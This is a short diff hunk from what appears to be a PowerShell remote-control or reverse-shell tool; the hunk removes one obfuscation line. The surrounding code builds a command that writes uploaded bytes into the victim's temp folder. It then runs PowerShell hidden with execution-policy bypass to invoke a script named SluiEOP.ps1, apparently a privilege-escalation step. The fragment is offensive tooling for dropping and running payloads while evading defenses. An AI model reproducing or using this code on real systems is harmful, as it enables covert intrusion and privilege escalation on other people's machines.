@@ -939,7 +939,6 @@ While($Client.Connected)
               $File = $File.Split('\')[-1];
               $File = $File.Split('/')[-1];
               $Command = "`$1=`"`$env:tmp\#`";`$2=@;If(!([System.IO.File]::Exists(`"`$1`"))){[System.IO.File]::WriteAllBytes(`"`$1`",`$2);`"`$1`"};powershell -exec bypass -w 1 -File `"$env:TMP\SluiEOP.ps1`" `"$mYcOMMAND`""
-              $Command = Variable_Obfuscation(Character_Obfuscation($Command));
               $Command = $Command -replace "#","$File";
               $Command = $Command -replace "@","$FileBytes";
               $Upload = $True;
